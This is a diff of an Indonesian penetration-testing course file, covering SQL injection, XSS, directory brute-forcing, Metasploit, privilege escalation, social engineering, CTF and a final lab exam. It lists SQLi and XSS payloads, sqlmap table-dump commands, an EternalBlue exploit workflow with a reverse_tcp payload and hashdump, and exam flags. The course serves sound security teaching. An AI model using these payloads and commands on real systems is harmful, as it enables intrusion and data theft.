-2. **Lakukan reconnaissance menyeluruh** sebelum scanning
-3. **Dokumentasikan semua command** yang dijalankan
-4. **Prioritaskan temuan** berdasarkan severity
-5. **Review laporan** sebelum submit
+1. 📖 Baca instruksi dengan teliti
+2. 🔍 Reconnaissance menyeluruh dulu
+3. 📝 Dokumentasikan semua command
+4. 📊 Prioritaskan temuan berdasarkan severity
+5. ✅ Review laporan sebelum submit
 
-> 🍀 **Good luck!** Tunjukkan kemampuan terbaik Anda!
+> 🍀 **Good luck!** Tunjukkan kemampuan terbaikmu!
 `,
     prerequisites: [
       'Menyelesaikan Session 1, 2, dan 3',
@@ -596,181 +706,182 @@ Rekomendasi mitigasi yang spesifik dan actionable.
   // Session 5: Web Application Security & SQL Injection
   session5: {
     theoryContent: `
-# 🌐 Web Application Security & SQL Injection
+# 🌐 Session 5: Web Application Security & SQL Injection
 
-## 🎯 Overview
+<div class="intro-box">
 
-Web Application Security adalah bidang yang fokus pada keamanan aplikasi berbasis web. Menurut OWASP, kerentanan web tetap menjadi salah satu vektor serangan paling umum.
+## 🎯 Apa yang Akan Dipelajari?
 
----
+Di sesi ini kamu akan mempelajari keamanan aplikasi web, terutama **SQL Injection** - salah satu kerentanan paling berbahaya di web!
 
-## 📊 OWASP Top 10 (2021)
-
-| Rank | Vulnerability |
-|------|--------------|
-| 1 | Broken Access Control |
-| 2 | Cryptographic Failures |
-| 3 | **Injection (SQL, Command, etc.)** |
-| 4 | Insecure Design |
-| 5 | Security Misconfiguration |
-| 6 | Vulnerable Components |
-| 7 | Authentication Failures |
-| 8 | Software Integrity Failures |
-| 9 | Logging & Monitoring Failures |
-| 10 | Server-Side Request Forgery |
+</div>
 
 ---
 
-## 💉 SQL Injection
+## 📚 Bagian 1: OWASP Top 10
 
-### Apa itu SQL Injection?
-SQL Injection adalah kerentanan yang memungkinkan penyerang menyisipkan kode SQL berbahaya ke dalam query aplikasi.
+<div class="comparison-table">
 
-### Contoh Vulnerable Code
+### 🔝 10 Kerentanan Web Teratas (2021)
+
+| Rank | 🔍 Vulnerability | ⚠️ Risiko |
+|------|------------------|-----------|
+| **1** | Broken Access Control | 🔴 Kritis |
+| **2** | Cryptographic Failures | 🔴 Kritis |
+| **3** | **Injection (SQL, dll)** | 🔴 Kritis |
+| **4** | Insecure Design | 🟠 Tinggi |
+| **5** | Security Misconfiguration | 🟠 Tinggi |
+| **6** | Vulnerable Components | 🟡 Sedang |
+| **7** | Authentication Failures | 🟠 Tinggi |
+| **8** | Software Integrity Failures | 🟡 Sedang |
+| **9** | Logging & Monitoring Failures | 🟡 Sedang |
+| **10** | SSRF | 🟡 Sedang |
+
+</div>
+
+---
+
+## 📚 Bagian 2: SQL Injection
+
+### 💉 Apa itu SQL Injection?
+
+SQL Injection terjadi ketika input user langsung dimasukkan ke query SQL tanpa sanitasi.
+
+<div class="warning-box">
+
+### ❌ Kode Vulnerable (Jangan Ditiru!)
+
 \`\`\`php
-// VULNERABLE!
+// BERBAHAYA! Input user langsung masuk query
 $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
 \`\`\`
 
-### Attack Examples
+</div>
 
-#### 1. Authentication Bypass
+### ⚔️ Teknik-teknik SQL Injection
+
+#### 1️⃣ Authentication Bypass
+
 \`\`\`
 Username: admin' --
-Password: anything
-\`\`\`
+Password: apapun
+
 Query menjadi:
-\`\`\`sql
-SELECT * FROM users WHERE username='admin' --' AND password='anything'
+SELECT * FROM users WHERE username='admin' --' AND password='apapun'
+                                            ^^ sisa query jadi komentar!
 \`\`\`
 
-#### 2. UNION-based SQLi
+#### 2️⃣ UNION-based SQLi
+
 \`\`\`
 id=1 UNION SELECT username,password FROM users--
 \`\`\`
 
-#### 3. Boolean-based Blind SQLi
+#### 3️⃣ Boolean-based Blind SQLi
+
 \`\`\`
-id=1 AND 1=1  (true - normal response)
-id=1 AND 1=2  (false - different response)
+id=1 AND 1=1  → Response normal (true)
+id=1 AND 1=2  → Response berbeda (false)
 \`\`\`
 
-#### 4. Time-based Blind SQLi
+#### 4️⃣ Time-based Blind SQLi
+
 \`\`\`
-id=1; WAITFOR DELAY '0:0:5'--  (delay 5 seconds if vulnerable)
+id=1; WAITFOR DELAY '0:0:5'--  → Delay 5 detik jika vulnerable
 \`\`\`
 
 ---
 
-## 🔧 SQLMap
+## 📚 Bagian 3: SQLMap
 
-**SQLMap** adalah tool otomatis untuk mendeteksi dan mengeksploitasi SQL injection.
+### 🔧 Tool Otomatis untuk SQL Injection
 
-### Basic Usage
 \`\`\`bash
-sqlmap -u "http://target.com/page?id=1" --dbs
-\`\`\`
-
-### Common Options
-| Option | Description |
-|--------|-------------|
-| \`-u\` | Target URL with parameter |
-| \`--dbs\` | Enumerate databases |
-| \`--tables\` | Enumerate tables |
-| \`--dump\` | Dump table data |
-| \`-D <db>\` | Specify database |
-| \`-T <table>\` | Specify table |
-| \`--batch\` | Non-interactive mode |
-
-### Attack Flow
-\`\`\`bash
-# 1. Test for SQLi
-sqlmap -u "http://target.com/page?id=1"
-
-# 2. Get databases
+# Test vulnerability & enumerate databases
 sqlmap -u "http://target.com/page?id=1" --dbs
 
-# 3. Get tables from database
+# Enumerate tables
 sqlmap -u "http://target.com/page?id=1" -D dbname --tables
 
-# 4. Dump table content
+# Dump data dari table
 sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
 \`\`\`
 
+<div class="info-box">
+
+### 📌 Common SQLMap Options
+
+| Option | Fungsi |
+|--------|--------|
+| \`-u\` | Target URL dengan parameter |
+| \`--dbs\` | List semua database |
+| \`--tables\` | List semua table |
+| \`--dump\` | Dump isi table |
+| \`-D <db>\` | Pilih database |
+| \`-T <table>\` | Pilih table |
+| \`--batch\` | Mode non-interaktif |
+
+</div>
+
 ---
 
-## 🕷️ Cross-Site Scripting (XSS)
+## 📚 Bagian 4: Cross-Site Scripting (XSS)
 
-### Types of XSS
+### 🕷️ Jenis-jenis XSS
 
-#### 1. Reflected XSS
-Payload di-reflect langsung dari request ke response.
+1. **Reflected XSS** - Payload dari URL langsung direfleksikan
+2. **Stored XSS** - Payload disimpan di database
+3. **DOM-based XSS** - Dieksekusi di client-side
+
+### 💣 Contoh Payload XSS
+
 \`\`\`html
 <script>alert('XSS')</script>
-\`\`\`
-
-#### 2. Stored XSS
-Payload disimpan di database dan ditampilkan ke users lain.
-
-#### 3. DOM-based XSS
-Payload dieksekusi di client-side tanpa server involvement.
-
-### XSS Payloads
-\`\`\`html
-<script>alert(document.cookie)</script>
 <img src=x onerror=alert('XSS')>
 <svg onload=alert('XSS')>
-"><script>alert(String.fromCharCode(88,83,83))</script>
 \`\`\`
 
 ---
 
-## 🔍 Directory Bruteforce
+## 📚 Bagian 5: Directory Bruteforce
 
-### Dirb
+### 📂 Dirb
+
 \`\`\`bash
+# Bruteforce directory
 dirb http://target.com /usr/share/dirb/wordlists/common.txt
+
+# Save output
 dirb http://target.com -o results.txt
 \`\`\`
 
-### Common Directories
+### 📁 Directory yang Sering Dicari
+
 \`\`\`
 /admin, /login, /dashboard, /api
-/backup, /config, /uploads, /temp
-/.git, /.svn, /.env
+/backup, /config, /uploads, /.git
 /robots.txt, /sitemap.xml
 \`\`\`
 
 ---
 
-## 🛡️ Mitigation
+## 🎯 Tugas Praktikum Sesi Ini
 
-### SQL Injection Prevention
-\`\`\`php
-// Use Prepared Statements
-$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
-$stmt->execute([$_GET['id']]);
-\`\`\`
+<div class="task-box">
 
-### XSS Prevention
-- Output encoding/escaping
-- Content Security Policy (CSP)
-- Input validation
-- HttpOnly cookies
+### 📋 Yang Harus Kamu Lakukan:
 
----
+1. ✅ Identifikasi titik SQL Injection
+2. ✅ Gunakan SQLMap untuk enumerate database
+3. ✅ Extract informasi sensitif
+4. ✅ Uji kerentanan XSS
+5. ✅ Lakukan directory enumeration
 
-## 📋 Tugas Praktikum
+**🎯 Target**: http://192.168.1.100
 
-1. Identifikasi titik injeksi SQL pada target
-2. Gunakan SQLMap untuk enumerasi database
-3. Extract informasi sensitif dari database
-4. Uji kerentanan XSS pada form input
-5. Lakukan directory enumeration
+</div>
 
-**Target**: http://192.168.1.100 (vulnerable web app)
-
-> ⚠️ **Peringatan**: Hanya lakukan pada sistem yang Anda miliki izin!
+> ⚠️ **Peringatan**: Hanya lakukan pada sistem yang kamu miliki izin!
 `,
     prerequisites: [
       'Menyelesaikan Session 1-4',
@@ -796,19 +907,29 @@ $stmt->execute([$_GET['id']]);
   // Session 6: Metasploit Framework & Privilege Escalation
   session6: {
     theoryContent: `
-# ⚔️ Metasploit Framework & Privilege Escalation
+# ⚔️ Session 6: Metasploit Framework & Privilege Escalation
 
-## 🎯 Apa itu Metasploit?
+<div class="intro-box">
 
-**Metasploit Framework** adalah platform penetration testing paling populer dan powerful. Dikembangkan oleh Rapid7, Metasploit menyediakan:
-- Database exploit yang komprehensif
-- Payload generation
-- Post-exploitation tools
-- Evasion techniques
+## 🎯 Apa yang Akan Dipelajari?
+
+Di sesi ini kamu akan mempelajari **Metasploit** - framework exploitation paling powerful, dan teknik **Privilege Escalation** untuk meningkatkan akses.
+
+</div>
 
 ---
 
-## 🏗️ Arsitektur Metasploit
+## 📚 Bagian 1: Pengantar Metasploit
+
+### 🗡️ Apa itu Metasploit?
+
+**Metasploit Framework** adalah platform penetration testing dengan:
+- 📦 Database exploit komprehensif
+- 🎯 Payload generation
+- 🔧 Post-exploitation tools
+- 🛡️ Evasion techniques
+
+### 🏗️ Arsitektur Metasploit
 
 \`\`\`
 ┌─────────────────────────────────────────┐
@@ -820,153 +941,146 @@ $stmt->execute([$_GET['id']]);
 └─────────────────────────────────────────┘
 \`\`\`
 
-### Module Types:
-| Type | Description |
-|------|-------------|
-| **Exploits** | Code that takes advantage of vulnerabilities |
-| **Payloads** | Code executed after exploitation |
-| **Auxiliary** | Scanners, fuzzers, etc. |
-| **Post** | Post-exploitation modules |
-| **Encoders** | Obfuscate payloads |
+<div class="comparison-table">
+
+### 📦 Jenis-jenis Module
+
+| Module | Fungsi |
+|--------|--------|
+| **Exploits** | Memanfaatkan kerentanan |
+| **Payloads** | Kode yang dieksekusi setelah exploit |
+| **Auxiliary** | Scanner, fuzzer, dll |
+| **Post** | Post-exploitation |
+| **Encoders** | Obfuscate payload |
+
+</div>
 
 ---
 
-## 🚀 Basic Workflow
+## 📚 Bagian 2: Basic Workflow
 
-### 1. Start Metasploit
+### 🚀 Langkah-langkah Menggunakan Metasploit
+
 \`\`\`bash
+# 1. Start Metasploit
 msfconsole
-\`\`\`
 
-### 2. Search for Exploits
-\`\`\`bash
-msf6 > search type:exploit platform:windows smb
+# 2. Search exploit
+msf6 > search type:exploit windows smb
 msf6 > search cve:2017-0144
-\`\`\`
 
-### 3. Use Exploit
-\`\`\`bash
+# 3. Use exploit
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
-\`\`\`
 
-### 4. Show Options
-\`\`\`bash
-msf6 exploit(ms17_010_eternalblue) > show options
-msf6 exploit(ms17_010_eternalblue) > show payloads
-\`\`\`
+# 4. View options
+msf6 exploit(ms17_010) > show options
 
-### 5. Configure Options
-\`\`\`bash
-msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
-msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
-msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
-\`\`\`
+# 5. Configure
+msf6 exploit(ms17_010) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010) > set LHOST 192.168.1.50
 
-### 6. Execute
-\`\`\`bash
-msf6 exploit(ms17_010_eternalblue) > exploit
-# atau
-msf6 exploit(ms17_010_eternalblue) > run
+# 6. Execute!
+msf6 exploit(ms17_010) > exploit
 \`\`\`
 
 ---
 
-## 🐚 Meterpreter
+## 📚 Bagian 3: Meterpreter
 
-**Meterpreter** adalah advanced payload yang berjalan di memory dan menyediakan shell powerful.
+### 🐚 Shell Terkuat
 
-### Core Commands
+**Meterpreter** adalah advanced payload yang berjalan di memori.
+
 \`\`\`bash
-meterpreter > sysinfo          # System information
-meterpreter > getuid           # Current user
-meterpreter > getsystem        # Privilege escalation
+# Core Commands
+meterpreter > sysinfo          # Info sistem
+meterpreter > getuid           # User saat ini
+meterpreter > getsystem        # Escalate ke SYSTEM
 meterpreter > hashdump         # Dump password hashes
-meterpreter > shell            # Drop to system shell
-\`\`\`
+meterpreter > shell            # Drop ke system shell
 
-### File Operations
-\`\`\`bash
+# File Operations
 meterpreter > pwd              # Current directory
 meterpreter > ls               # List files
 meterpreter > download file    # Download file
 meterpreter > upload file      # Upload file
-\`\`\`
 
-### Process Management
-\`\`\`bash
+# Process Management
 meterpreter > ps               # List processes
-meterpreter > migrate PID      # Migrate to process
+meterpreter > migrate PID      # Pindah ke process lain
 meterpreter > background       # Background session
 \`\`\`
 
 ---
 
-## 📈 Privilege Escalation
+## 📚 Bagian 4: Privilege Escalation
 
-### Windows Privilege Escalation
+### 📈 Windows PrivEsc
 
-#### 1. Using getsystem
 \`\`\`bash
+# Menggunakan getsystem
 meterpreter > getsystem
-\`\`\`
 
-#### 2. Local Exploits
-\`\`\`bash
+# Cari exploit lokal
 msf6 > use post/multi/recon/local_exploit_suggester
 msf6 > set SESSION 1
 msf6 > run
 \`\`\`
 
-#### 3. Common Techniques
-- Unquoted service paths
-- Weak service permissions
-- DLL hijacking
-- Token impersonation
-- Scheduled tasks
+**Teknik Umum:**
+- 🔧 Unquoted service paths
+- 🔐 Weak service permissions
+- 📚 DLL hijacking
+- 🎭 Token impersonation
 
-### Linux Privilege Escalation
+### 🐧 Linux PrivEsc
 
-#### 1. SUID Binaries
 \`\`\`bash
+# Cari SUID binaries
 find / -perm -4000 2>/dev/null
-\`\`\`
 
-#### 2. Sudo Misconfigurations
-\`\`\`bash
+# Cek sudo permissions
 sudo -l
-\`\`\`
 
-#### 3. Kernel Exploits
-\`\`\`bash
-uname -a  # Check kernel version
+# Cek kernel version
+uname -a
 searchsploit linux kernel 4.4.0
 \`\`\`
 
 ---
 
-## 🔥 Famous Exploits
+## 🔥 Exploit Terkenal
 
-| CVE | Name | Target |
+<div class="comparison-table">
+
+| CVE | Nama | Target |
 |-----|------|--------|
-| CVE-2017-0144 | EternalBlue | Windows SMB |
-| CVE-2014-6271 | Shellshock | Bash |
-| CVE-2021-44228 | Log4Shell | Java |
-| CVE-2019-0708 | BlueKeep | Windows RDP |
+| **CVE-2017-0144** | EternalBlue | Windows SMB |
+| **CVE-2014-6271** | Shellshock | Bash |
+| **CVE-2021-44228** | Log4Shell | Java |
+| **CVE-2019-0708** | BlueKeep | Windows RDP |
+
+</div>
 
 ---
 
-## 📋 Tugas Praktikum
+## 🎯 Tugas Praktikum Sesi Ini
 
-1. Launch msfconsole dan familiarisasi dengan interface
-2. Search dan select exploit yang sesuai
-3. Configure exploit options (RHOSTS, LHOST, payload)
-4. Execute exploit dan dapatkan shell
-5. Lakukan privilege escalation
-6. Collect information dari compromised system
+<div class="task-box">
 
-**Target**: 192.168.1.100 (Windows Server)
+### 📋 Yang Harus Kamu Lakukan:
 
-> ⚠️ **Peringatan**: Metasploit adalah tool powerful. Gunakan hanya pada sistem yang Anda memiliki izin!
+1. ✅ Launch msfconsole
+2. ✅ Search dan select exploit
+3. ✅ Configure dan execute
+4. ✅ Lakukan privilege escalation
+5. ✅ Collect information dari system
+
+**🎯 Target**: 192.168.1.100 (Windows Server)
+
+</div>
+
+> ⚠️ **Peringatan**: Metasploit sangat powerful. Gunakan dengan bijak!
 `,
     prerequisites: [
       'Menyelesaikan Session 1-5',
@@ -982,11 +1096,11 @@ searchsploit linux kernel 4.4.0
     ],
     keyCommands: [
       { command: 'msfconsole', description: 'Start Metasploit Framework console', example: 'msfconsole' },
-      { command: 'search <keyword>', description: 'Search for exploits, payloads, or modules', example: 'search type:exploit windows smb' },
-      { command: 'use <module>', description: 'Select a module to use', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
-      { command: 'show options', description: 'Display required and optional settings for current module', example: 'show options' },
-      { command: 'set <option> <value>', description: 'Set a value for an option', example: 'set RHOSTS 192.168.1.100' },
-      { command: 'exploit / run', description: 'Execute the current module', example: 'exploit' },
+      { command: 'search <keyword>', description: 'Search for exploits, payloads, atau modules', example: 'search type:exploit windows smb' },
+      { command: 'use <module>', description: 'Select module yang akan digunakan', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
+      { command: 'show options', description: 'Display settings yang diperlukan', example: 'show options' },
+      { command: 'set <option> <value>', description: 'Set nilai untuk option', example: 'set RHOSTS 192.168.1.100' },
+      { command: 'exploit / run', description: 'Execute module saat ini', example: 'exploit' },
       { command: 'sessions', description: 'List active sessions', example: 'sessions -l' },
     ],
   },
@@ -994,176 +1108,152 @@ searchsploit linux kernel 4.4.0
   // Session 7: Report Writing, Social Engineering & CTF
   session7: {
     theoryContent: `
-# 📝 Report Writing, Social Engineering & CTF
+# 📝 Session 7: Report Writing, Social Engineering & CTF
 
-## 🎯 Overview
+<div class="intro-box">
 
-Session ini mencakup tiga skill penting:
-1. **Professional Report Writing** - Dokumentasi yang efektif
-2. **Social Engineering** - Memahami human factor
-3. **CTF Challenges** - Mengasah problem-solving skills
+## 🎯 Apa yang Akan Dipelajari?
+
+Sesi ini mencakup 3 skill penting:
+1. 📄 **Report Writing** - Dokumentasi profesional
+2. 🎭 **Social Engineering** - Human hacking
+3. 🏁 **CTF** - Capture The Flag challenges
+
+</div>
 
 ---
 
-## 📄 Penetration Testing Report
+## 📚 Bagian 1: Professional Report Writing
 
-### Struktur Report Profesional
+### 📄 Struktur Laporan Pentest
 
-#### 1. Executive Summary
-- Overview untuk audience non-teknis
-- Key findings dan risk level
+<div class="info-box">
+
+#### 1️⃣ Executive Summary
+- Ringkasan untuk non-teknis
+- Key findings
 - Business impact
-- High-level recommendations
 
-#### 2. Methodology
-\`\`\`
-Planning → Reconnaissance → Scanning → 
-Exploitation → Post-Exploitation → Reporting
-\`\`\`
+#### 2️⃣ Methodology
+- Langkah-langkah yang dilakukan
+- Tools yang digunakan
 
-#### 3. Scope & Objectives
-- Target systems/networks
-- Testing timeline
-- Out-of-scope items
-- Rules of engagement
+#### 3️⃣ Findings
+Setiap temuan harus memiliki:
+- 🏷️ **Title** - Nama deskriptif
+- 🎨 **Severity** - Critical/High/Medium/Low
+- 📊 **CVSS Score** - 0.0 - 10.0
+- 📝 **Description** - Penjelasan teknis
+- 📸 **Evidence** - Screenshot, logs
+- 💥 **Impact** - Dampak bisnis/teknis
+- 🔧 **Remediation** - Cara memperbaiki
 
-#### 4. Findings
-Untuk setiap finding, sertakan:
-| Element | Description |
-|---------|-------------|
-| Title | Clear, descriptive name |
-| Severity | Critical/High/Medium/Low |
-| CVSS Score | 0.0 - 10.0 |
-| Description | Technical explanation |
-| Evidence | Screenshots, logs, commands |
-| Impact | Business/technical impact |
-| Remediation | How to fix |
+#### 4️⃣ Recommendations
+- Diprioritaskan berdasarkan risiko
+- Spesifik dan actionable
 
-#### 5. Recommendations
-- Prioritized by risk
-- Specific & actionable
-- Include timeline
+</div>
 
 ---
 
-## 🎭 Social Engineering
+## 📚 Bagian 2: Social Engineering
 
-### Apa itu Social Engineering?
-Teknik manipulasi psikologis untuk mendapatkan informasi atau akses tanpa menggunakan technical exploitation.
+### 🎭 Seni Manipulasi Manusia
 
-### Common Techniques
+**Social Engineering** adalah teknik mendapatkan informasi/akses melalui manipulasi psikologis, bukan teknis.
 
-#### 1. Phishing
-\`\`\`
-Email palsu yang meniru organisasi legitimate
-untuk mencuri credentials atau install malware
-\`\`\`
+<div class="comparison-table">
 
-#### 2. Pretexting
-Membuat skenario palsu untuk mendapatkan kepercayaan korban.
+### 🎯 Teknik-teknik Social Engineering
 
-#### 3. Baiting
-Menawarkan sesuatu yang menarik (USB, download) yang berisi malware.
+| Teknik | Cara Kerja |
+|--------|------------|
+| **Phishing** | Email palsu meniru organisasi legit |
+| **Pretexting** | Membuat skenario/cerita palsu |
+| **Baiting** | USB atau download yang mengandung malware |
+| **Tailgating** | Mengikuti orang ke area restricted |
+| **Vishing** | Penipuan via telepon |
 
-#### 4. Tailgating
-Mengikuti orang yang authorized untuk masuk ke area restricted.
+</div>
 
-#### 5. Vishing
-Voice phishing - penipuan melalui telepon.
+### 🛡️ Pertahanan
 
-### Defense Against Social Engineering
-- Security awareness training
-- Verify identities
-- Don't share sensitive info
-- Report suspicious activities
-- Use multi-factor authentication
+- ✅ Security awareness training
+- ✅ Verifikasi identitas
+- ✅ Jangan share info sensitif
+- ✅ Multi-factor authentication
 
 ---
 
-## 🏁 CTF (Capture The Flag)
+## 📚 Bagian 3: CTF (Capture The Flag)
 
-### Apa itu CTF?
-Kompetisi keamanan siber di mana peserta memecahkan challenges untuk menemukan "flags" tersembunyi.
+### 🏁 Apa itu CTF?
 
-### Format Flag
+Kompetisi keamanan siber di mana peserta memecahkan challenges untuk menemukan **flag** tersembunyi.
+
+### 📋 Format Flag
+
 \`\`\`
 FLAG{this_is_a_sample_flag}
-flag{another_format}
 CTF{challenge_solved}
 \`\`\`
 
-### CTF Categories
+### 🎮 Kategori CTF
 
-#### 1. Web
-- SQL Injection
-- XSS
-- Authentication bypass
-- IDOR
+<div class="tools-grid">
 
-#### 2. Cryptography
-- Encoding (Base64, Hex)
-- Classic ciphers (Caesar, Vigenère)
-- Modern crypto (RSA, AES)
-
-#### 3. Forensics
-- File analysis
-- Memory forensics
-- Network captures
-
-#### 4. Reverse Engineering
-- Binary analysis
-- Decompilation
-- Debugging
-
-#### 5. Pwn (Binary Exploitation)
-- Buffer overflow
-- Format strings
-- ROP chains
-
-#### 6. Steganography
-- Hidden data in images
-- Audio steganography
-- File carving
-
----
-
-## 🧰 CTF Tools
-
-| Category | Tools |
+| Kategori | Topik |
 |----------|-------|
-| Web | Burp Suite, curl, browser DevTools |
-| Crypto | CyberChef, dcode.fr, Python |
-| Forensics | Autopsy, Wireshark, strings |
-| RevEng | Ghidra, radare2, gdb |
-| Stego | steghide, zsteg, binwalk |
+| **Web** | SQLi, XSS, IDOR |
+| **Crypto** | Encoding, Ciphers |
+| **Forensics** | File analysis, Memory |
+| **Reverse** | Binary, Decompilation |
+| **Pwn** | Buffer overflow |
+| **Stego** | Hidden data in images |
+
+</div>
+
+### 🧰 Tools CTF
+
+| Kategori | Tools |
+|----------|-------|
+| Web | Burp Suite, curl, DevTools |
+| Crypto | CyberChef, dcode.fr |
+| Forensics | Autopsy, Wireshark |
+| Stego | steghide, binwalk |
 
 ---
 
-## 💡 CTF Tips
+## 💡 Tips CTF
 
-1. **Read carefully** - Challenge description often contains hints
-2. **Start simple** - Try basic techniques first
-3. **Take notes** - Document your approach
-4. **Google wisely** - Learn from writeups
-5. **Collaborate** - Team work makes dream work
+1. 📖 **Baca dengan teliti** - Challenge description sering mengandung hint
+2. 🔍 **Mulai dari yang simple** - Coba teknik dasar dulu
+3. 📝 **Catat semuanya** - Dokumentasi adalah kunci
+4. 🔎 **Google dengan bijak** - Belajar dari writeup
+5. 👥 **Kolaborasi** - Teamwork makes the dream work
 
 ---
 
-## 📋 Tugas Praktikum
+## 🎯 Tugas Praktikum Sesi Ini
 
-### Report Writing
-1. Buat executive summary dari temuan Session 1-6
-2. Format findings dengan proper evidence
-3. Buat recommendations yang actionable
+<div class="task-box">
 
-### CTF Challenges
-1. Selesaikan Web challenges
-2. Decode pesan cryptography
-3. Temukan hidden flags
+### 📋 Yang Harus Kamu Lakukan:
 
-**CTF Platform**: Tersedia di menu CTF
+**Report Writing:**
+1. ✅ Buat executive summary dari Session 1-6
+2. ✅ Format findings dengan evidence
 
-> 🎮 **Have fun!** CTF adalah cara terbaik untuk belajar sambil bermain!
+**CTF:**
+1. ✅ Selesaikan Web challenges
+2. ✅ Decode pesan cryptography
+3. ✅ Temukan hidden flags
+
+**🎮 CTF Platform**: Tersedia di menu CTF
+
+</div>
+
+> 🎮 **Have fun!** CTF adalah cara terbaik belajar sambil bermain!
 `,
     prerequisites: [
       'Menyelesaikan Session 1-6',
@@ -1188,74 +1278,87 @@ CTF{challenge_solved}
   // Session 8: UAS
   session8: {
     theoryContent: `
-# 🎓 UAS - Full Penetration Test Simulation
+# 🎓 Session 8: UAS - Full Penetration Test Simulation
 
-## 🎯 Tujuan Ujian Akhir
+<div class="intro-box">
 
-Ujian Akhir Semester (UAS) adalah **simulasi penetration test lengkap** yang menguji semua kemampuan yang telah Anda pelajari sepanjang semester.
+## 🎯 Final Exam!
+
+Ujian Akhir Semester adalah **simulasi penetration test lengkap** yang menguji SEMUA yang telah kamu pelajari.
+
+</div>
 
 ---
 
 ## 📋 Scope Pengujian
 
-### Environment
-- **Network**: 10.0.0.0/24
-- **Primary Target**: 10.0.0.50 (Windows Server 2019)
-- **Secondary Target**: 10.0.0.51 (Linux Web Server)
-- **Tertiary Target**: 10.0.0.52 (Database Server)
+<div class="info-box">
 
-### Objectives
-1. Complete reconnaissance pada semua target
-2. Identifikasi dan exploit vulnerabilities
-3. Privilege escalation
-4. Data exfiltration (flags)
-5. Professional penetration testing report
+### 🌐 Target Environment
+
+| 🖥️ Target | 📍 IP | 💻 OS |
+|-----------|-------|-------|
+| **Primary** | 10.0.0.50 | Windows Server 2019 |
+| **Secondary** | 10.0.0.51 | Linux Web Server |
+| **Tertiary** | 10.0.0.52 | Database Server |
+
+**Network Range**: 10.0.0.0/24
+
+</div>
 
 ---
 
-## 🔄 Methodology
+## 📊 Rubrik Penilaian
 
-Ikuti metodologi penetration testing standar:
+<div class="comparison-table">
+
+| 📋 Komponen | 📊 Bobot | 📝 Kriteria |
+|-------------|----------|-------------|
+| Reconnaissance | 15% | Kelengkapan info gathering |
+| Scanning | 15% | Thoroughness enumeration |
+| Exploitation | 25% | Successful exploitation |
+| Privilege Escalation | 15% | Escalating access |
+| Data Collection | 15% | Finding all flags |
+| Report Quality | 15% | Professional documentation |
+
+</div>
+
+---
+
+## 🔄 Metodologi
 
 \`\`\`
 ┌──────────────┐    ┌─────────────┐    ┌──────────────┐
-│    PHASE 1   │───▶│   PHASE 2   │───▶│   PHASE 3    │
+│   PHASE 1    │───▶│   PHASE 2   │───▶│   PHASE 3    │
 │ Reconnaissance│    │  Scanning   │    │ Exploitation │
 └──────────────┘    └─────────────┘    └──────────────┘
                                               │
 ┌──────────────┐    ┌─────────────┐           ▼
-│    PHASE 5   │◀───│   PHASE 4   │◀───┌──────────────┐
+│   PHASE 5    │◀───│   PHASE 4   │◀───┌──────────────┐
 │  Reporting   │    │Post-Exploit │    │ Priv Escalate│
 └──────────────┘    └─────────────┘    └──────────────┘
 \`\`\`
 
 ---
 
-## 📊 Rubrik Penilaian
+## ⏱️ Timeline
 
-| Komponen | Bobot | Kriteria |
-|----------|-------|----------|
-| Reconnaissance | 15% | Kelengkapan information gathering |
-| Scanning | 15% | Thoroughness of enumeration |
-| Exploitation | 25% | Successful exploitation |
-| Privilege Escalation | 15% | Escalating access |
-| Data Collection | 15% | Finding all flags |
-| Report Quality | 15% | Professional documentation |
+<div class="info-box">
+
+| Phase | Duration |
+|-------|----------|
+| **Reconnaissance** | 30 menit |
+| **Scanning & Enumeration** | 45 menit |
+| **Exploitation & PrivEsc** | 60 menit |
+| **Reporting** | 45 menit |
+| **TOTAL** | **3 jam** |
+
+</div>
 
 ---
 
-## 📝 Deliverables
+## 🏆 Flags to Collect
 
-### 1. Penetration Testing Report
-Dokumen komprehensif yang mencakup:
-- Executive Summary
-- Technical Findings
-- Evidence (screenshots, logs)
-- Risk Assessment
-- Recommendations
-
-### 2. Flags Collected
-Submit semua flags yang ditemukan:
 \`\`\`
 FLAG{reconnaissance_master}
 FLAG{port_scanner_pro}
@@ -1264,84 +1367,82 @@ FLAG{privilege_escalated}
 FLAG{final_boss_defeated}
 \`\`\`
 
-### 3. Reflection
-Tuliskan learning experience Anda:
-- Challenges yang dihadapi
-- Bagaimana Anda mengatasinya
-- Skill yang paling berkembang
-- Rencana pengembangan selanjutnya
-
 ---
 
-## ⏱️ Timeline
+## 📝 Deliverables
 
-| Phase | Duration |
-|-------|----------|
-| Reconnaissance | 30 menit |
-| Scanning & Enumeration | 45 menit |
-| Exploitation & PrivEsc | 60 menit |
-| Reporting | 45 menit |
-| **Total** | **3 jam** |
+1. **Penetration Testing Report**
+   - Executive Summary
+   - Technical Findings
+   - Evidence (screenshots)
+   - Risk Assessment
+   - Recommendations
 
----
+2. **Flags Collected**
+   - Submit semua flags yang ditemukan
 
-## 🛠️ Allowed Tools
-
-Semua tools yang telah dipelajari:
-- OSINT: whois, nslookup, dig, host
-- Scanning: nmap, nikto
-- Exploitation: sqlmap, msfconsole, searchsploit
-- Password: john, hashid
-- Web: dirb, curl
+3. **Reflection**
+   - Learning experience
+   - Challenges & solutions
 
 ---
 
 ## ⚠️ Rules of Engagement
 
-### ✅ Allowed
-- Scan dan enumerate semua target dalam scope
-- Exploit vulnerabilities yang ditemukan
-- Privilege escalation
-- Collect flags dan evidence
-- Document everything
+<div class="warning-box">
 
-### ❌ Not Allowed
+### ✅ Allowed:
+- Scan & enumerate semua target dalam scope
+- Exploit vulnerabilities
+- Privilege escalation
+- Collect flags & evidence
+
+### ❌ Not Allowed:
 - Attack systems outside scope
 - DoS attacks
-- Destructive actions (delete/modify data)
-- Share findings dengan mahasiswa lain
-- Use external help selama ujian
+- Destructive actions
+- Share answers
+
+</div>
 
 ---
 
 ## 💡 Final Tips
 
-1. **Manage your time** - Jangan terlalu lama di satu target
-2. **Document everything** - Screenshot setiap langkah penting
-3. **Think systematically** - Follow the methodology
-4. **Don't panic** - Jika stuck, move on dan kembali nanti
-5. **Quality over quantity** - Lebih baik complete sedikit target daripada partial banyak
